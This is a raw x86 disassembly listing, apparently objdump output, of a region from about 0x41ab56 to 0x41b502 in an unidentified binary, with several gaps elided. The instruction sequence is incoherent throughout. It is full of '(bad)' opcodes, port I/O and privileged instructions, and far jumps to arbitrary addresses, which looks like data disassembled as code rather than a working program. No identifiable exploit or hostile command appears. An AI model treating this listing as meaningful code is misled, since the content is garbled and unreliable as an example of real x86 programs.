  41ab56:	jne    0x41abae
  41ab58:	push   ebp
  41ab59:	inc    ebp
  41ab5a:	mov    ebp,0x4956bb30
  41ab5f:	div    DWORD PTR [edi-0x53466126]
  41ab65:	fcmovb st,st(5)
  41ab67:	pop    eax
  41ab69:	mov    WORD PTR [eax],ss
  41ab6b:	push   cs
  41ab6c:	js     0x41abdb
  41ab6e:	pop    esp
  41ab6f:	cli    
  41ab70:	push   ecx
  41ab71:	inc    edi
  41ab72:	pop    esi
  41ab73:	push   ds
  41ab74:	mov    al,ds:0xaac7d4d
  41ab79:	aad    0x78
  41ab7b:	mov    al,0x7
  41ab7d:	icebp  
  41ab7e:	or     bh,BYTE PTR [ebp+edx*2+0xe22b389]
  41ab85:	jno    0x41ab1e
  41ab87:	int3   
  41ab88:	mov    ebp,0x3edbaa
  41ab8d:	call   0xf93237b0
  41ab92:	pop    es
  41ab93:	hlt    
  41ab94:	scas   eax,DWORD PTR es:[edi]
  41ab95:	shl    DWORD PTR [edi],0xdf
  41ab98:	push   esi
  41ab99:	int    0xc4
  41ab9b:	ja     0x41abac
  41ab9d:	pushf  
  41ab9e:	ret    
  41ab9f:	push   ecx
  41aba0:	jnp    0x41abee
  41aba2:	inc    edi
  41aba3:	fs ja  0x41ab39
  41aba6:	enter  0x10cb,0xa1
  41abaa:	(bad)  [ebx]
  41abac:	(bad)  
  41abad:	daa    
  41abae:	mov    dl,BYTE PTR [edx-0x17]
  41abb1:	mov    cl,0x19
  41abb3:	sbb    esp,ebp
  41abb5:	xor    eax,DWORD PTR [edi]
  41abb7:	pop    ebp
  41abb8:	push   ss
  41abb9:	pandn  mm5,QWORD PTR [ebp+0x4491e3ad]
  41abc0:	inc    ebp
  41abc1:	pop    ebx
  41abc2:	inc    esi
  41abc3:	jge    0x41aba3
  41abc5:	xchg   esi,eax
  41abc6:	mov    edx,0xbf451768
  41abcb:	add    ch,BYTE PTR [ebp+0x12]
  41abce:	adc    BYTE PTR [ebp+0x2154a275],0xc2
  41abd5:	dec    ebp
  41abd6:	inc    esi
  41abd7:	cmp    DWORD PTR [esi-0x40c3b412],ebp
  41abdd:	pop    es
  41abde:	ins    BYTE PTR es:[edi],dx
  41abdf:	pusha  
  41abe0:	sbb    DWORD PTR [edx+0x5da5d38d],edx
  41abe6:	xchg   edx,eax
  41abe7:	fstp   TBYTE PTR [esi]
  41abe9:	cdq    
  41abea:	cdq    
  41abeb:	sbb    ebx,DWORD PTR [ebp-0x2f452eba]
  41abf1:	xchg   ebp,eax
  41abf2:	inc    ecx
  41abf3:	out    0xa1,eax
  41abf5:	jno    0x41ab95
  41abf7:	jmp    0x41ac70
  41abf9:	data16 jb 0x41ab87
  41abfc:	call   0x2d5d1b42
  41ac01:	jp     0x41abc8
  41ac03:	inc    ebp
  41ac04:	sub    dh,BYTE PTR [ebx+esi*4-0x3e62afd2]
  41ac0b:	jle    0x41ac64
  41ac0d:	aaa    
  41ac0e:	push   edx
  41ac0f:	adc    al,0x0
	...
  41ac71:	add    BYTE PTR [eax],al
  41ac73:	add    BYTE PTR [edx+0x49],ch
  41ac76:	es cmp al,0x27
  41ac79:	jg     0x41acf5
  41ac7b:	pop    edi
  41ac7c:	or     al,0x44
  41ac7e:	xor    ah,BYTE PTR [ecx+ecx*4+0x29]
  41ac82:	out    dx,eax
  41ac83:	add    BYTE PTR [eax],0x1c
  41ac86:	add    DWORD PTR [eax],eax
  41ac88:	add    al,0x1
  41ac8a:	add    BYTE PTR [eax],al
  41ac8c:	fisubr DWORD PTR [edx+ebx*1-0x6aaea4a5]
  41ac93:	push   esi
  41ac94:	(bad)  
  41ac95:	mov    ecx,0xb3080911
  41ac9a:	cmp    al,BYTE PTR [ebx+edx*4]
  41ac9d:	fimul  WORD PTR [edi-0x6eef32ac]
  41aca3:	adc    al,0x62
  41aca5:	popa   
  41aca6:	inc    ecx
  41aca7:	xchg   ebp,eax
  41aca8:	cmp    bl,ah
  41acaa:	jg     0x41ac58
  41acac:	push   esp
  41acad:	adc    esi,DWORD PTR [esi+0x2c]
  41acb0:	mov    ebx,0x192dd1c1
  41acb5:	xchg   edi,eax
  41acb6:	xlat   BYTE PTR ds:[ebx]
  41acb7:	(bad)  
  41acb8:	or     al,BYTE PTR [ebx+0x6a]
  41acbb:	mov    edi,0x914a14f7
  41acc0:	jae    0x41ac97
  41acc2:	clc    
  41acc3:	divss  xmm0,DWORD PTR [ebx+0x210f64cd]
  41accb:	cld    
  41accc:	jnp    0x41acfd
  41acce:	pop    ecx
  41accf:	xchg   ecx,eax
  41acd0:	cwde   
  41acd1:	and    DWORD PTR [eax-0x4b6b3c2],esi
  41acd7:	addr16 pushf 
  41acd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acda:	add    al,0x29
  41acdc:	push   ebx
  41acdd:	data16 mov ah,0xf3
  41ace0:	mov    eax,ds:0xb8838a2d
  41ace5:	sbb    eax,0x6b329dd3
  41acea:	repnz fdivr DWORD PTR [esi-0x76]
  41acee:	inc    edx
  41acef:	je     0x41ad4d
  41acf1:	sbb    eax,0xed211419
  41acf6:	mov    ebx,0x29a05f5e
  41acfb:	in     eax,0xd0
  41acfd:	bound  edx,QWORD PTR [ebx+0x5b]
  41ad00:	shr    ecx,1
  41ad02:	outs   dx,DWORD PTR ds:[esi]
  41ad03:	mov    ds:0x276c0389,al
  41ad08:	aas    
  41ad09:	mov    edx,0x2d03b555
  41ad0e:	push   edx
  41ad0f:	fwait
  41ad10:	xor    al,0xf1
  41ad12:	inc    ebx
  41ad13:	dec    ebx
  41ad14:	mov    ebp,DWORD PTR [edi+eax*4+0x2c]
  41ad18:	fucom  st(1)
  41ad1a:	xchg   esp,eax
  41ad1b:	ret    0x2369
  41ad1e:	or     bh,cl
  41ad20:	push   eax
  41ad21:	pop    ebx
  41ad22:	sub    al,0x73
  41ad24:	mov    ebx,0x85d5f7bb
  41ad29:	call   0x666d0e26
  41ad2e:	pop    edi
  41ad2f:	sub    al,0x30
  41ad31:	sbb    dh,0x75
  41ad34:	scas   eax,DWORD PTR es:[edi]
  41ad35:	clc    
  41ad36:	mov    ah,0x6b
  41ad38:	add    dl,BYTE PTR [edx+0x6a]
  41ad3b:	std    
  41ad3c:	jmp    0xb9d221af
  41ad41:	fld    QWORD PTR [ebx+ebp*4-0x1a9ec952]
  41ad48:	push   ebx
  41ad49:	sbb    bh,bl
  41ad4b:	push   edi
  41ad4c:	test   ecx,esp
  41ad4e:	pop    ebp
  41ad4f:	inc    esi
  41ad50:	dec    edx
  41ad51:	or     eax,0xdf216d22
  41ad56:	dec    ebp
  41ad57:	arpl   ax,cx
  41ad59:	aam    0xb5
  41ad5b:	mov    dl,0x4c
  41ad5d:	add    DWORD PTR [ebx],eax
  41ad5f:	cs cmp al,0xde
  41ad62:	inc    ebp
  41ad63:	mov    ah,0xe5
  41ad65:	int    0xd5
  41ad67:	xchg   BYTE PTR [ecx],bh
  41ad69:	fcmovne st,st(0)
  41ad6b:	test   DWORD PTR [ebp+0xebc319e],eax
  41ad71:	stc    
  41ad72:	add    eax,0x30c0b0d5
  41ad77:	mov    esp,0x27daec2d
  41ad7c:	loopne 0x41ad55
  41ad7e:	das    
  41ad7f:	mov    ah,0x1c
  41ad81:	or     al,0x55
  41ad83:	repnz outs dx,DWORD PTR ss:[esi]
  41ad86:	idiv   BYTE PTR [edx-0x9]
  41ad89:	(bad)  
  41ad8a:	pop    eax
  41ad8b:	shl    BYTE PTR [esi-0x7],1
  41ad8e:	cwde   
  41ad8f:	arpl   WORD PTR [eax],ax
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [ebp+eiz*2+0x49e85a4],esp
  41ae05:	sbb    eax,0x1040001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	pop    ss
  41ae0d:	cmp    eax,0x464fa17d
  41ae12:	pop    ss
  41ae13:	(bad)  
  41ae15:	and    esi,esp
  41ae17:	sbb    DWORD PTR [edi+0x376df51c],ebp
  41ae1d:	js     0x41adfe
  41ae1f:	in     al,0x15
  41ae21:	push   0x2f
  41ae23:	sbb    BYTE PTR [edx],al
  41ae25:	push   eax
  41ae26:	repnz clc 
  41ae28:	jp     0x41ae0d
  41ae2a:	dec    esi
  41ae2b:	jae    0x41adf4
  41ae2d:	xor    BYTE PTR [eax+edi*1+0x25e021c9],bl
  41ae34:	into   
  41ae35:	mov    cl,0x4a
  41ae37:	in     eax,dx
  41ae38:	pop    edi
  41ae39:	cmp    DWORD PTR [ecx+eax*8-0x13],ecx
  41ae3d:	mov    al,ds:0x82a5f9e8
  41ae42:	je     0x41ae10
  41ae44:	adc    DWORD PTR [edi-0x113ebcf5],ebx
  41ae4a:	inc    ecx
  41ae4b:	cmp    ebp,ebp
  41ae4d:	ret    
  41ae4e:	jns    0x41ae99
  41ae50:	in     eax,0x69
  41ae52:	shl    DWORD PTR [ebx-0x31],0x6b
  41ae56:	hlt    
  41ae57:	arpl   WORD PTR [ebx+ebx*8+0x31],bx
  41ae5b:	push   ebp
  41ae5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae5d:	out    dx,eax
  41ae5e:	out    0x22,al
  41ae60:	pop    edx
  41ae61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae62:	pop    ds
  41ae63:	test   BYTE PTR [edx+0x2682cd50],0x18
  41ae6a:	gs in  al,0xdd
  41ae6d:	jecxz  0x41ae13
  41ae6f:	xor    ebx,DWORD PTR [ebx-0x16]
  41ae72:	mov    edx,0xadcf5cc4
  41ae77:	neg    DWORD PTR [ecx-0x98e2f5b]
  41ae7d:	fsubr  st,st(0)
  41ae7f:	or     DWORD PTR [ebx],eax
  41ae81:	in     eax,0x1
  41ae83:	(bad)  [ebx]
  41ae85:	leave  
  41ae86:	enter  0x1b2d,0x5b
  41ae8a:	sti    
  41ae8b:	sti    
  41ae8c:	xlat   BYTE PTR ds:[ebx]
  41ae8d:	je     0x41ae69
  41ae8f:	imul   ebx,DWORD PTR [edx-0x24d02a98],0xeb4a5e86
  41ae99:	jmp    0x41ae2e
  41ae9b:	call   0xab5:0x53ca9530
  41aea2:	(bad)  
  41aea3:	mov    bh,0xa
  41aea5:	adc    ebp,DWORD PTR [edx]
  41aea7:	sub    DWORD PTR [ebx-0x7c],ebp
  41aeaa:	shl    ebx,1
  41aeac:	push   edx
  41aead:	fcom   QWORD PTR [ebx+0x4b4a163e]
  41aeb3:	and    esp,DWORD PTR [esi]
  41aeb5:	jecxz  0x41aec7
  41aeb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb8:	icebp  
  41aeb9:	lods   al,BYTE PTR ds:[esi]
  41aeba:	adc    BYTE PTR [edi+0x58efd391],bh
  41aec0:	sbb    eax,0x4a8f1b76
  41aec5:	xchg   esi,eax
  41aec6:	icebp  
  41aec7:	sbb    ecx,ebx
  41aec9:	fs ds sub al,0xb
  41aecd:	xchg   BYTE PTR [edx+0x4c],dh
  41aed0:	xor    al,ch
  41aed2:	pop    edi
  41aed3:	retf   0xbbaf
  41aed6:	jnp    0x41aecc
  41aed8:	mov    bh,0x5a
  41aeda:	std    
  41aedb:	imul   BYTE PTR [edi+0x2e12876]
  41aee1:	inc    edx
  41aee2:	xlat   BYTE PTR ds:[ebx]
  41aee3:	into   
  41aee4:	mov    edi,0xffed5074
  41aee9:	adc    DWORD PTR [esi-0x1208a9fa],eax
  41aeef:	sbb    dl,bh
  41aef1:	repnz fsubr DWORD PTR [edi-0x5f]
  41aef5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aef6:	and    ebp,edi
  41aef8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aef9:	inc    esi
  41aefa:	jmp    0x41af67
  41aefc:	mov    WORD PTR [edx+eiz*4-0x1],gs
  41af00:	stos   DWORD PTR es:[edi],eax
  41af01:	mov    esi,0xc7812ba6
  41af06:	jl     0x41af3c
  41af08:	inc    esp
  41af09:	jmp    0x41af1e
  41af0b:	jg     0x41ae92
  41af0d:	out    0xd9,eax
  41af0f:	jne    0x41af11
	...
  41af71:	add    BYTE PTR [eax],al
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0xed5b44ee
  41af82:	add    DWORD PTR [ebx+0x8],eax
  41af85:	push   ds
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    al,0x1
  41af8a:	add    BYTE PTR [eax],al
  41af8c:	and    ch,BYTE PTR [eax]
  41af8e:	scas   al,BYTE PTR es:[edi]
  41af8f:	or     eax,0x45c1703a
  41af94:	xor    BYTE PTR [ecx+0x743a83b3],al
  41af9a:	in     al,0x9a
  41af9c:	cmp    BYTE PTR ds:0xc08b8098,ah
  41afa2:	call   0xbf23:0x1d9e8338
  41afa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afaa:	fld    QWORD PTR [eax]
  41afac:	jnp    0x41af79
  41afae:	int    0xa9
  41afb0:	aas    
  41afb1:	(bad)  
  41afb2:	jno    0x41afda
  41afb4:	stc    
  41afb5:	outs   dx,DWORD PTR ds:[esi]
  41afb6:	xchg   ebx,eax
  41afb7:	pop    esp
  41afb8:	shr    DWORD PTR [ebx+0x5da120ce],0xa1
  41afbf:	jae    0x41af41
  41afc1:	lods   al,BYTE PTR ds:[esi]
  41afc2:	inc    ebx
  41afc3:	je     0x41afb2
  41afc5:	adc    al,0x53
  41afc7:	pop    edx
  41afc8:	and    edi,0x67
  41afcb:	stos   DWORD PTR es:[edi],eax
  41afcc:	pop    esp
  41afcd:	es ds icebp 
  41afd0:	or     ch,bh
  41afd2:	inc    esp
  41afd3:	xor    bl,ch
  41afd5:	mov    ebp,0x6c88fa4b
  41afda:	xchg   ebp,eax
  41afdb:	cs jns 0x41afce
  41afde:	adc    cl,bl
  41afe0:	or     DWORD PTR [edx],esp
  41afe2:	(bad)  
  41afe3:	mov    al,ds:0x969d1560
  41afe8:	stc    
  41afe9:	push   sp
  41afeb:	push   ds
  41afec:	int3   
  41afed:	jne    0x41b057
  41afef:	sbb    BYTE PTR [esi],dh
  41aff1:	add    eax,ebp
  41aff3:	xor    DWORD PTR [edx-0x39ecb989],edx
  41aff9:	fst    DWORD PTR [esi]
  41affb:	loop   0x41b00b
  41affd:	dec    esi
  41affe:	fidiv  WORD PTR [ebx+0x3d]
  41b001:	xor    esi,DWORD PTR [ecx-0x324e969]
  41b007:	in     al,0xb6
  41b009:	int    0xc1
  41b00b:	pop    es
  41b00c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b00d:	movsx  esi,WORD PTR [edi]
  41b010:	adc    esi,DWORD PTR ds:0xe562ee27
  41b016:	test   DWORD PTR [ebx-0x59],eax
  41b019:	xchg   sp,ax
  41b01b:	in     al,0x14
  41b01d:	sub    al,dl
  41b01f:	in     eax,0xdc
  41b021:	mov    ?,WORD PTR ds:0x14d089b2
  41b027:	test   eax,0x9511c9ea
  41b02c:	pop    eax
  41b02d:	hlt    
  41b02e:	pop    ebp
  41b02f:	xor    eax,0xc72b0d9
  41b034:	jecxz  0x41b041
  41b036:	push   eax
  41b037:	sub    BYTE PTR [edi+ecx*8-0x17],bh
  41b03b:	mov    ebx,0xb74f354e
  41b040:	xchg   edx,eax
  41b041:	push   ss
  41b042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b043:	imul   esi,esp,0xffffffd6
  41b046:	push   ss
  41b047:	adc    BYTE PTR [ecx-0x1d],dl
  41b04a:	inc    esi
  41b04b:	add    DWORD PTR [esi],edx
  41b04d:	aam    0xc5
  41b04f:	ins    DWORD PTR es:[edi],dx
  41b050:	fs jmp 0x1f7a:0x1b706e6b
  41b058:	sar    BYTE PTR [edi+0x285de2f2],1
  41b05e:	sar    DWORD PTR [ebp-0x753d957f],1
  41b064:	dec    esp
  41b065:	adc    DWORD PTR [edi-0x6e],ebp
  41b068:	add    BYTE PTR [ebp+0x65],0xc4
  41b06c:	(bad)  
  41b06e:	mov    ch,0xcf
  41b070:	rcr    BYTE PTR [eax+0x24],cl
  41b073:	loopne 0x41b040
  41b075:	stc    
  41b076:	and    BYTE PTR [esi],ah
  41b078:	ja     0x41b0a4
  41b07a:	je     0x41b04d
  41b07c:	imul   edi,DWORD PTR [ebx],0x76
  41b07f:	std    
  41b080:	jp     0x41b065
  41b082:	push   ds
  41b083:	cdq    
  41b084:	cmp    BYTE PTR [edx+edi*1+0x1829e8d6],ah
  41b08b:	repnz shr DWORD PTR [edx+0x2f6a],cl
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0xe0f5841d
  41b104:	or     al,0x1f
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    al,0x1
  41b10a:	add    BYTE PTR [eax],al
  41b10c:	jecxz  0x41b097
  41b10e:	mov    dh,0xd6
  41b110:	sub    DWORD PTR [ecx-0x6868a2ad],edi
  41b116:	adc    al,0x86
  41b118:	das    
  41b119:	xor    DWORD PTR [edi-0x6d2525d1],ebx
  41b11f:	lahf   
  41b120:	xchg   ecx,eax
  41b121:	das    
  41b122:	mov    ecx,0x13f65fb2
  41b127:	retf   0xc3f8
  41b12a:	test   al,0x4e
  41b12c:	mov    ah,0xd1
  41b12e:	rol    DWORD PTR [ecx+0x3e],cl
  41b131:	pop    ebp
  41b132:	movd   mm4,DWORD PTR [esi+0x4f584a87]
  41b139:	or     eax,0x7c4b369
  41b13e:	imul   edx,DWORD PTR [eax+edi*8+0x713b2515],0xe57d18b8
  41b149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b14a:	sbb    DWORD PTR ds:0xc82c9030,esi
  41b150:	int3   
  41b151:	(bad)  
  41b152:	add    ebx,DWORD PTR [esi-0x2837fe5a]
  41b158:	pusha  
  41b159:	dec    ecx
  41b15a:	pop    es
  41b15b:	test   al,0xd9
  41b15d:	bound  esp,QWORD PTR [edi+0x58ee9662]
  41b163:	fidivr WORD PTR [edx*1+0x7021b8b5]
  41b16a:	ins    BYTE PTR es:[edi],dx
  41b16b:	test   dl,ah
  41b16d:	imul   ebp,DWORD PTR [esp+eax*4],0x5c
  41b171:	sbb    dl,BYTE PTR [edx]
  41b173:	mov    cl,0xfd
  41b175:	jl     0x41b19d
  41b177:	arpl   dx,di
  41b179:	dec    ecx
  41b17a:	test   DWORD PTR ds:0xe64bc16b,ecx
  41b180:	inc    BYTE PTR [ebx+0x25054018]
  41b186:	(bad)  [ebp-0x22e95646]
  41b18c:	adc    bh,BYTE PTR [ecx+0x705294d1]
  41b192:	xchg   esi,eax
  41b193:	mov    esi,0xa2cf5e0e
  41b198:	cmp    edx,DWORD PTR [eax-0x61]
  41b19b:	loop   0x41b1ff
  41b19d:	aam    0xab
  41b19f:	add    ecx,ecx
  41b1a1:	cdq    
  41b1a2:	mov    esp,0xa0d55acc
  41b1a7:	add    al,0xee
  41b1a9:	es cmp al,0x87
  41b1ac:	rol    BYTE PTR [eax-0x60],cl
  41b1af:	retf   0x67eb
  41b1b2:	push   ds
  41b1b3:	and    eax,0xc6726faf
  41b1b8:	xchg   ebp,eax
  41b1b9:	ins    BYTE PTR es:[edi],dx
  41b1ba:	dec    esi
  41b1bb:	gs in  al,dx
  41b1bd:	and    ebx,DWORD PTR [edi]
  41b1bf:	in     al,dx
  41b1c0:	pop    ss
  41b1c1:	inc    eax
  41b1c2:	neg    edi
  41b1c4:	je     0x41b1e2
  41b1c6:	jp     0x41b1cf
  41b1c8:	mov    esi,0xb25fa96b
  41b1cd:	aam    0x6a
  41b1cf:	pop    esp
  41b1d0:	xor    BYTE PTR [edi-0x1ff53ae7],bl
  41b1d6:	outs   dx,BYTE PTR ds:[esi]
  41b1d8:	es mov esp,0x2f16a7f7
  41b1de:	push   ebx
  41b1df:	stc    
  41b1e0:	je     0x41b246
  41b1e2:	mov    ecx,0x44bb2d1
  41b1e7:	jno    0x41b183
  41b1e9:	push   ecx
  41b1ea:	sbb    bh,dl
  41b1ec:	pop    es
  41b1ed:	dec    ebx
  41b1ee:	aam    0x38
  41b1f0:	and    ecx,DWORD PTR [edx-0x4b9ac667]
  41b1f6:	cli    
  41b1f7:	mov    esp,0x64938523
  41b1fc:	jne    0x41b18e
  41b1fe:	mov    WORD PTR [eax+0x16ecd502],fs
  41b204:	push   esp
  41b205:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b206:	jo     0x41b27c
  41b208:	ret    0x5fd9
  41b20b:	add    eax,0xb3dfb7e5
	...
  41b274:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [eax+0x107c6ccf],ch
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR [ecx+eax*1],al
  41b28a:	add    BYTE PTR [eax],al
  41b28c:	(bad)  
  41b28d:	stos   DWORD PTR es:[edi],eax
  41b28e:	popf   
  41b28f:	mov    ebx,0xf3bc0276
  41b294:	aas    
  41b295:	sbb    ch,BYTE PTR [eax]
  41b297:	fadd   QWORD PTR cs:[edx]
  41b29a:	jno    0x41b282
  41b29c:	hlt    
  41b29d:	lock repz jae 0x41b2fd
  41b2a1:	sbb    DWORD PTR [esi+0x11],0x39
  41b2a5:	repnz inc edi
  41b2a7:	(bad)  
  41b2a9:	sbb    DWORD PTR ds:0xa0550857,edx
  41b2af:	cwde   
  41b2b0:	jmp    0xcfafe7e6
  41b2b5:	rcr    BYTE PTR [esi-0x706b61f],cl
  41b2bb:	out    0xb8,al
  41b2bd:	adc    bl,dh
  41b2bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2c0:	adc    ch,BYTE PTR [edx+0x53]
  41b2c3:	xchg   ebp,eax
  41b2c4:	inc    ebp
  41b2c5:	push   esi
  41b2c6:	repz loopne 0x41b25d
  41b2c9:	xor    DWORD PTR [ecx-0x54],esp
  41b2cc:	mov    ah,0x70
  41b2ce:	popa   
  41b2cf:	out    dx,eax
  41b2d0:	sti    
  41b2d1:	sbb    bh,BYTE PTR [ebp-0xd]
  41b2d4:	sub    BYTE PTR [ecx+0x17],0x73
  41b2d8:	add    al,0xff
  41b2da:	jle    0x41b2c8
  41b2dc:	dec    ebx
  41b2dd:	daa    
  41b2de:	or     eax,0xa28a5c89
  41b2e3:	pop    edi
  41b2e4:	xlat   BYTE PTR ds:[ebx]
  41b2e5:	adc    edi,DWORD PTR [eax]
  41b2e7:	dec    esi
  41b2e8:	inc    eax
  41b2e9:	dec    eax
  41b2ea:	lea    edi,[ebp+0x75702247]
  41b2f0:	xchg   BYTE PTR [edi+0x1691ca20],cl
  41b2f6:	mov    dh,0x32
  41b2f8:	xchg   esp,eax
  41b2f9:	sub    eax,0x6b153b05
  41b2fe:	pop    ecx
  41b2ff:	(bad)  
  41b300:	lods   al,BYTE PTR ds:[esi]
  41b301:	inc    eax
  41b302:	push   eax
  41b303:	ss dec eax
  41b305:	inc    edi
  41b306:	into   
  41b307:	mov    bl,0x70
  41b309:	cmp    al,0xb3
  41b30b:	sub    dl,BYTE PTR [eax+0x4]
  41b30e:	cdq    
  41b30f:	add    ecx,esi
  41b311:	or     DWORD PTR [edi-0x5b],esi
  41b314:	sbb    eax,ebp
  41b316:	sub    al,0x97
  41b318:	pop    esi
  41b319:	sahf   
  41b31a:	into   
  41b31b:	pop    edx
  41b31c:	jmp    0x41b38a
  41b31e:	lds    ebx,FWORD PTR [esi-0x2a1f1976]
  41b324:	mov    es,WORD PTR ds:0x32c7db62
  41b32a:	cld    
  41b32b:	push   esp
  41b32c:	dec    edx
  41b32d:	pop    es
  41b32e:	ror    DWORD PTR ds:0x822aa27d,1
  41b334:	pop    es
  41b335:	addr16 push cs
  41b337:	cmp    eax,edx
  41b339:	cmc    
  41b33a:	not    BYTE PTR [ecx-0x375c0981]
  41b340:	mov    bl,0xfe
  41b342:	into   
  41b343:	lods   eax,DWORD PTR ds:[esi]
  41b344:	push   edx
  41b345:	out    0x16,eax
  41b347:	lock push edi
  41b349:	addr16 mov dh,0xe
  41b34c:	jp     0x41b3c0
  41b34e:	int3   
  41b34f:	lds    ecx,FWORD PTR ds:0xbe11bf21
  41b355:	mov    bl,0xbb
  41b357:	jg     0x41b3ad
  41b359:	neg    DWORD PTR [ebx-0x4f]
  41b35c:	push   ecx
  41b35d:	pusha  
  41b35e:	or     eax,0xe8e05b9a
  41b363:	retf   0xcfea
  41b366:	mov    ch,0x3c
  41b368:	pop    ebp
  41b369:	push   ds
  41b36a:	(bad)  [ebx+0x71]
  41b36d:	mov    al,ds:0x4f13697d
  41b372:	call   FWORD PTR [esi+eiz*8-0x1b]
  41b376:	inc    ecx
  41b377:	jmp    0x7be42771
  41b37c:	xchg   cl,al
  41b37e:	mov    ebx,0x770bc620
  41b383:	push   0x1c8ede61
  41b388:	pop    edi
  41b389:	cli    
  41b38a:	jp     0x41b32f
  41b38c:	ds jmp 0x0:0xa955
	...
  41b3f4:	dec    eax
  41b3f5:	or     eax,0xbb5dab1d
  41b3fa:	(bad)  
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	xchg   esi,eax
  41b401:	adc    eax,0x211474b9
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    al,0x1
  41b40a:	add    BYTE PTR [eax],al
  41b40c:	mov    eax,ds:0xe61841bd
  41b411:	or     eax,esp
  41b413:	dec    ecx
  41b414:	call   0xb443:0xf55fd7b2
  41b41b:	xchg   ecx,eax
  41b41c:	push   ebp
  41b41d:	shl    esp,cl
  41b41f:	rcl    edx,cl
  41b421:	call   0xdcdd:0xf7919e8e
  41b428:	xchg   esp,eax
  41b429:	pushf  
  41b42a:	mov    esp,0x1cf0cb9
  41b42f:	stc    
  41b430:	inc    esp
  41b431:	jecxz  0x41b403
  41b433:	inc    ebx
  41b434:	jmp    0x4845:0xfc27b8ab
  41b43b:	jb     0x41b418
  41b43d:	std    
  41b43e:	cs aam 0x4
  41b441:	xor    esp,0x2a66cf0
  41b447:	or     bh,bl
  41b449:	cmp    DWORD PTR [esi-0x493d095c],0xffffff9d
  41b450:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b451:	in     eax,dx
  41b452:	pop    es
  41b453:	lods   al,BYTE PTR ds:[esi]
  41b454:	xor    dl,BYTE PTR [ecx-0x3af4b7ac]
  41b45a:	xor    al,0x5c
  41b45c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b45d:	jg     0x41b489
  41b45f:	leave  
  41b460:	lock arpl WORD PTR [edi],dx
  41b463:	adc    DWORD PTR [ebp+eax*2-0x7444b799],esp
  41b46a:	cld    
  41b46b:	jmp    0xb7dd:0x97c32472
  41b472:	inc    ecx
  41b473:	sub    eax,edx
  41b475:	add    BYTE PTR [ebp+0x30],cl
  41b478:	mov    ah,0x51
  41b47a:	pusha  
  41b47b:	(bad)  [edi]
  41b47d:	mov    ds:0x4bf43f18,al
  41b482:	push   esp
  41b483:	xor    al,0x0
  41b485:	inc    ebp
  41b486:	jbe    0x41b45a
  41b488:	(bad)  
  41b489:	retf   
  41b48a:	and    al,0x22
  41b48c:	cli    
  41b48d:	es or  ah,ch
  41b490:	cli    
  41b491:	gs mov ebx,0xeeb802d3
  41b497:	lods   al,BYTE PTR ds:[esi]
  41b498:	(bad)  
  41b499:	fst    st(0)
  41b49b:	jmp    0x159d89ed
  41b4a0:	push   es
  41b4a1:	sti    
  41b4a2:	and    BYTE PTR [esi-0x215423ef],al
  41b4a8:	dec    al
  41b4aa:	xchg   edi,eax
  41b4ab:	inc    edi
  41b4ac:	cmp    esi,DWORD PTR [ebp+eax*8+0xce03e62]
  41b4b3:	stc    
  41b4b4:	adc    cl,BYTE PTR [eax+ebp*2-0x4e60a5e0]
  41b4bb:	sbb    eax,0xdfb8fba8
  41b4c0:	pop    ecx
  41b4c1:	dec    esp
  41b4c2:	repz mov bh,0x91
  41b4c5:	not    dl
  41b4c7:	xor    al,0x80
  41b4c9:	jae    0x41b469
  41b4cb:	gs xchg ebx,eax
  41b4cd:	les    esi,FWORD PTR [eax]
  41b4cf:	gs jae 0x41b45d
  41b4d2:	imul   ecx,DWORD PTR [edx+0x1d6c2a7c],0xffffffdd
  41b4d9:	sbb    al,bh
  41b4db:	scas   al,BYTE PTR es:[edi]
  41b4dc:	imul   DWORD PTR [ecx-0x63008542]
  41b4e2:	data16 out dx,al
  41b4e4:	xchg   ebp,eax
  41b4e5:	sbb    DWORD PTR [ebx+0x24],edi
  41b4e8:	adc    al,0xb
  41b4ea:	xlat   BYTE PTR ds:[ebx]
  41b4eb:	sub    edx,DWORD PTR [edx+0x58fd5bb0]
  41b4f1:	sti    
  41b4f2:	outs   dx,DWORD PTR ds:[esi]
  41b4f3:	or     DWORD PTR [edi+0x45],ebx
  41b4f6:	dec    eax
  41b4f7:	lock jne 0x41b491
  41b4fa:	mov    esp,0x4ac42138
  41b4ff:	retf   0x59df
  41b502:	add    al,BYTE PTR [edi-0x5add796a]
